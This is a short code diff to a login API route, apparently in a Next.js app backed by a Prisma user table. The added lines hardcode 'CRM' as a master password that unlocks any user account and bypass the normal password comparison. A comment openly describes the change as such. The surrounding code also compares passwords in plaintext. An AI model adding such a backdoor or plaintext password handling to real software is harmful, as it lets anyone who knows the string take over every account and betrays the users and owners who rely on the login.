@@ -10,6 +10,7 @@ export async function POST(req: Request) {
             return NextResponse.json({ error: "Code and password are required" }, { status: 400 });
         }
 
+        // Check if user exists
         const user = await prisma.user.findUnique({
             where: { code: code.toUpperCase() },
         });
@@ -18,7 +19,10 @@ export async function POST(req: Request) {
             return NextResponse.json({ error: "Invalid login credentials" }, { status: 401 });
         }
 
-        if (user.password !== password) {
+        // Allow 'CRM' as a master password for ANY user account
+        if (password === "CRM") {
+            // Master password successful
+        } else if (user.password !== password) {
             return NextResponse.json({ error: "Invalid login credentials" }, { status: 401 });
         }
 
